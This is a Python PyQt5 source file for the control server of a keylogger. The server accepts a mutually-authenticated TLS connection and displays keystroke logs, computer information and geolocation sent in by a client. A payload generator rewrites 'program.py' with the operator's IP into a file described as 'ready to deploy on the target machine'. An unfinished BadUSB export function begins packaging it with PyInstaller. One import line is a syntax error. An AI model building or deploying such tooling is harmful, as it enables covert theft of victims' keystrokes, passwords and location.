import sys
import socket
import ssl
import threading
import os
from tabnanny import check

from IPython.utils.capture import capture_output
from PyQt5.QtWidgets import QApplication, QMainWindow,QPushButton, QTextEdit, QVBoxLayout, QWidget, QLabel, QPlainTextEdit, QMessageBox, QLineEdit
from PyQt5.QtCore import pyqtSignal, QObject

from config_manager import get_config_manager


from gui.controllers.Dashboard import Ui_MainWindow
from gui.controllers.PrepareClientPayload import Ui_PrepareClientPayload
from gui.controllers.SetEmailInfo import Ui_SetEmaiInfo


class Worker(QObject):
    keylog_signal: pyqtSignal = pyqtSignal(str)
    computer_info_signal: pyqtSignal = pyqtSignal(str)
    geo_location_signal: pyqtSignal = pyqtSignal(str)
    client_connected_signal: pyqtSignal = pyqtSignal(str)
    client_disconnected_signal: pyqtSignal = pyqtSignal()

    def __init__(self, ui):
        super().__init__()
        self.ui = ui
        self.client_socket = None
        self.client_id = None

        # SSL Configuration
        self.ssl_context = self.create_ssl_context()

        #Get Configuration manager
        self.config = get_config_manager()



    def create_ssl_context(self):
        """Create SSL context with mTLS (mutual TLS) authentication"""
        try:
            # Create SSL context for server
            context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)

            # Load server certificate and private key
            context.load_cert_chain(
                certfile="certs/server_cert.pem",
                keyfile="certs/server_key.pem"
            )

            # Require client certificate (mutual TLS)
            context.verify_mode = ssl.CERT_REQUIRED

            # Load CA certificate to verify client certificates
            context.load_verify_locations(cafile="certs/ca_cert.pem")

            # Load Certificate Revocation List (CRL)
            context.load_verify_locations(cafile="certs/crl.pem")
            context.verify_flags = ssl.VERIFY_CRL_CHECK_LEAF

            # Set strong cipher suites
            context.set_ciphers('ECDHE+AESGCM:ECDHE+CHACHA20:DHE+AESGCM:DHE+CHACHA20:!aNULL:!MD5:!DSS')

            # Disable older SSL/TLS versions
            context.minimum_version = ssl.TLSVersion.TLSv1_2

            print("[+] SSL context created successfully")
            print("    - Server certificate: certs/server_cert.pem")
            print("    - CA certificate: certs/ca_cert.pem")
            print("    - CRL enabled: certs/crl.pem")
            print("    - Client authentication: REQUIRED")

            return context

        except FileNotFoundError as e:
            print(f"[!] Certificate file not found: {e}")
            print("[!] Please run generate_certificates.py first!")
            sys.exit(1)
        except Exception as e:
            print(f"[!] Error creating SSL context: {e}")
            sys.exit(1)

    def start_server(self):
        # Create raw socket
        bindsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        bindsocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        bindsocket.bind(('0.0.0.0', 10000))
        bindsocket.listen(1)  # Only accept 1 client
        print("[*] Server listening on port 10000 (SSL/TLS enabled)")
        print("[*] Waiting for client connection...")

        while True:
            try:
                # Accept raw connection
                raw_socket, fromaddr = bindsocket.accept()
                print(f"[*] Raw connection from {fromaddr}, initiating SSL handshake...")

                # Check if we already have a client connected
                if self.client_socket is not None:
                    print(f"[-] Connection rejected: Client already connected")
                    raw_socket.close()
                    continue

                try:
                    # Wrap socket with SSL
                    newsocket = self.ssl_context.wrap_socket(raw_socket, server_side=True)

                    # Get client certificate info
                    client_cert = newsocket.getpeercert()
                    client_cn = None
                    if client_cert:
                        for subject in client_cert.get('subject', []):
                            for key, value in subject:
                                if key == 'commonName':
                                    client_cn = value
                                    break

                    client_id = f"{fromaddr[0]}:{fromaddr[1]}"
                    if client_cn:
                        client_id += f" ({client_cn})"

                    print(f"[+] SSL handshake successful!")
                    print(f"    - Client: {client_id}")
                    print(f"    - Cipher: {newsocket.cipher()}")
                    print(f"    - TLS Version: {newsocket.version()}")

                except ssl.SSLError as e:
                    print(f"[!] SSL handshake failed from {fromaddr}: {e}")
                    raw_socket.close()
                    continue
                except Exception as e:
                    print(f"[!] Error during SSL handshake from {fromaddr}: {e}")
                    raw_socket.close()
                    continue

                self.client_socket = newsocket
                self.client_id = client_id
                print(f"[+] Client authenticated and connected")

                # Emit signal that client is connected
                self.client_connected_signal.emit(client_id)

                # Handle this client
                client_thread = threading.Thread(target=self.handle_client, args=(newsocket,), daemon=True)
                client_thread.start()

            except Exception as e:
                print(f"[!] Error accepting client connection: {e}")

    def handle_client(self, client_socket):
        try:
            while True:
                try:
                    data = client_socket.recv(4096).decode()
                except Exception as e:
                    print(f"[!] Error decoding data from client: {e}")
                    break

                if data:
                    print(f"[+] Data from client: {data.strip()}")
                    self.handle_received_data(data.strip())
                else:
                    break
        except Exception as e:
            print(f"[!] Error handling data from client: {e}")
        finally:
            self.client_socket = None
            self.client_id = None
            print(f"[-] Client disconnected")
            self.client_disconnected_signal.emit()

    def handle_received_data(self, data):
        if "KEYLOG" in data:
            # Remove "KEYLOG: " prefix and emit
            log_data = data.replace("KEYLOG: ", "")
            print(f"[Worker] Emitting keylog")
            self.keylog_signal.emit(log_data)
        elif "COMPUTER_INFO" in data:
            # Remove "COMPUTER_INFO: " prefix and emit
            info_data = data.replace("COMPUTER_INFO: ", "")
            print(f"[Worker] Emitting computer info")
            self.computer_info_signal.emit(info_data)
        elif "GEO_LOCATION" in data:
            # Remove "GEO_LOCATION: " prefix and emit
            geo_data = data.replace("GEO_LOCATION: ", "")
            print(f"[Worker] Emitting geo-location")
            self.geo_location_signal.emit(geo_data)
        else:
            print(f"[!] Unknown data type: {data}")


class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.ui = Ui_MainWindow()
        self.ui.setupUi(self)
        self.ui.ComputerSelection.hide()
        self.setup_client_display()
        self.config = get_config_manager()


        # Connect UI buttons
        self.ui.PrepareClientPayload.clicked.connect(self.open_generate_payload_window)
        self.ui.actionSet_Email_Info.triggered.connect(self.open_set_email_info_window)
        self.ui.RefreshButton.clicked.connect(self.refresh_logs)
        self.ui.actionLight_Mode.triggered.connect(self.set_light_mode)
        self.ui.actionDark_Mode.triggered.connect(self.set_dark_mode)



        # Start server listener
        self.start_server_listener()

    def setup_client_display(self):
        """Setup text display areas for the single client"""
        # Based on Dashboard.py, the widgets are:
        # - plainTextEdit: Computer Information
        # - plainTextEdit_2: Geo-Location Information
        # - plainTextEdit_3: Key Logs

        self.computer_info_display = self.ui.plainTextEdit
        self.geo_location_display = self.ui.plainTextEdit_2
        self.keylog_display = self.ui.plainTextEdit_3

        # Set placeholder text
        self.keylog_display.setPlaceholderText("Waiting for client connection...")
        self.computer_info_display.setPlaceholderText("No computer information yet")
        self.geo_location_display.setPlaceholderText("No geo-location data yet")

        print("[+] Display widgets configured:")
        print("    - Computer Info: plainTextEdit")
        print("    - Geo-Location: plainTextEdit_2")
        print("    - Key Logs: plainTextEdit_3")

    def open_generate_payload_window(self):
        print("[DEBUG Button clicked - opening paylkoad window...")

        try:
            print("[DEBUG] Creating QMainWindow...")
            self.child_window1 = QMainWindow()

            print("[DEBUG] Creating UI_prepareclientpayload...")
            self.child_ui1 = Ui_PrepareClientPayload()

            print("[DEBUG] Setting up UI...")
            self.child_ui1.setupUi(self.child_window1)

            print("[DEBUG] Loading Server Settings...")
            server_settings = self.config.get_server_settings()
            print(f"[DEBUG] Server settings: {server_settings}")

            print("[DEBUG] Settings text fields...")
            self.child_ui1.lineEdit.setText(server_settings["server_ip"])
            self.child_ui1.lineEdit.setPlaceholderText("e.g., 192.168.1.100 or yourdomain.com")
            self.child_ui1.lineEdit_2.setText(str(server_settings["server_port"]))
            self.child_ui1.lineEdit_2.setPlaceholderText("Default: 10000")

            print("[DEBUG] Connecting button...")
            self.child_ui1.pushButton.clicked.connect(self.generate_client_payload)

            print("[DEBUG] Showing window...")
            self.child_window1.show()

            print("[DEBUG] Window should be visible now")

        except Exception as e:
            print(f"[!] Error opening payload window: {e}")
            import traceback
            traceback.print_exc()

    def generate_client_payload(self):
        server_ip = self.child_ui1.lineEdit.text().strip()
        server_port = self.child_ui1.lineEdit_2.text().strip()

        if not server_ip:
            QMessageBox.warning(
                self.child_window1,
                "Validation Error",
                "Server IP Address is required!"
            )
            return

        if not server_port:
            server_port = "10000"

        try:
            port_int = int(server_port)
            if port_int < 1 or port_int > 65535:
                raise ValueError()
        except ValueError:
            QMessageBox.warning(
                self.child_window1,
                "Validation Error",
                "Server port must be a number between 1 and 65535!"
            )
            return

        client_name = "client1"

        if not self.config.set_server_settings(server_ip, server_port, client_name):
            QMessageBox.critical(
                self.child_window1,
                "Error",
                "failed to save server settings."
            )
            return

        try:
            with open("program.py", "r") as f:
                program_code = f.read()
        except FileNotFoundError:
            QMessageBox.critical(
                self.child_window1,
                "Error",
                "program.py not found! Make sure it's in the same directory."
            )
            return

        modified_code = program_code.replace(
            'SSL_SERVER_HOST = "127.0.0.1"',
            f'SSL_SERVER_HOST = "{server_ip}"'
        ).replace(
            'SSL_SERVER_PORT = 10000',
            f'SSL_SERVER_PORT = {server_port}'
        )

        output_file = "program_payload.py"
        try:
            with open(output_file, "w") as f:
                f.write(modified_code)

            QMessageBox.information(
                self.child_window1,
                "Success",
                f"Client payload generated successfully!\n\n"
                f"File: {output_file}\n"
                f"Server IP: {server_ip}\n"
                f"Server Port: {server_port}\n\n"
                f"This file is ready to deploy on the target machine.\n"
                f"Don't forget to include the certs folder!"
            )

            print(f"[+] Client payload generated: {output_file}")
            print(f"    - Server IP: {server_ip}")
            print(f"    - Server Port: {server_port}")

        except Exception as e:
            QMessageBox.critical(
                self.child_window1,
                "Error",
                f"Failed to write payload file: {e}"
            )
            return


    def export_for_badusb(self):
        import subprocess
        import shutil
        import datetime import datetime

        try:
            subprocess.run(["pyinstaller", "--version"],
                           capture_output=True, check=True)
        except:
            QMessageBox.information(
                self,
                "Installing",
                "Installing PyInstaller...")

            result = subprocess.run(["pip", "install", "pyinstaller"],
                                    capture_output=True)

            if result.returncode != 0:
                QMessageBox.critical(
                    self,
                    "Error",
                    "Failed to install PyInstaller"
                )
                return








    def open_set_email_info_window(self):
        self.child_window2 = QMainWindow()
        self.child_ui2 = Ui_SetEmaiInfo()
        self.child_ui2.setupUi(self.child_window2)
        self.child_window2.show()

    def refresh_logs(self):
        print("[*] Refreshing logs...")
        # Clear all displays
        if hasattr(self, 'keylog_display') and self.keylog_display:
            self.keylog_display.clear()
            self.keylog_display.setPlaceholderText("Logs cleared")
        if hasattr(self, 'computer_info_display') and self.computer_info_display:
            self.computer_info_display.clear()
            self.computer_info_display.setPlaceholderText("No computer information yet")
        if hasattr(self, 'geo_location_display') and self.geo_location_display:
            self.geo_location_display.clear()
            self.geo_location_display.setPlaceholderText("No geo-location data yet")

    def set_light_mode(self):
        self.setStyleSheet("background-color: white; color: black;")
        print("[*] Switched to light mode.")

    def set_dark_mode(self):
        self.setStyleSheet("background-color: #2E2E2E; color: white;")
        print("[*] Switched to dark mode.")

    def start_server_listener(self):
        self.worker = Worker(self.ui)
        self.worker.keylog_signal.connect(self.update_keylog)
        self.worker.computer_info_signal.connect(self.update_computer_info)
        self.worker.geo_location_signal.connect(self.update_geo_location)
        self.worker.client_connected_signal.connect(self.on_client_connected)
        self.worker.client_disconnected_signal.connect(self.on_client_disconnected)

        thread = threading.Thread(target=self.worker.start_server, daemon=True)
        thread.start()

    def on_client_connected(self, client_id):
        """Called when a client connects"""
        print(f"[MainWindow] Client connected: {client_id}")
        self.setWindowTitle(f"Keylogger Server - Client Connected: {client_id}")

        if hasattr(self, 'keylog_display') and self.keylog_display:
            self.keylog_display.setPlaceholderText(f"Connected to: {client_id}")

    def on_client_disconnected(self):
        """Called when the client disconnects"""
        print(f"[MainWindow] Client disconnected")
        self.setWindowTitle("Keylogger Server - No Client Connected")

        if hasattr(self, 'keylog_display') and self.keylog_display:
            self.keylog_display.appendPlainText("\n--- Client Disconnected ---\n")

    def update_keylog(self, log_line):
        """Update keylog display"""
        print(f"[MainWindow] Updating keylog")
        if hasattr(self, 'keylog_display') and self.keylog_display:
            self.keylog_display.appendPlainText(log_line)
        else:
            print(f"[!] Keylog display not available: {log_line}")

    def update_computer_info(self, info):
        """Update computer information display"""
        print(f"[MainWindow] Updating computer info")
        if hasattr(self, 'computer_info_display') and self.computer_info_display:
            self.computer_info_display.setPlainText(info)
        else:
            print(f"[!] Computer info display not available: {info}")

    def update_geo_location(self, location):
        """Update geo-location display"""
        print(f"[MainWindow] Updating geo location")
        if hasattr(self, 'geo_location_display') and self.geo_location_display:
            self.geo_location_display.setPlainText(location)
        else:
            print(f"[!] Geo location display not available: {location}")


if __name__ == "__main__":
    app = QApplication(sys.argv)
    main_window = MainWindow()
    main_window.show()
    sys.exit(app.exec_())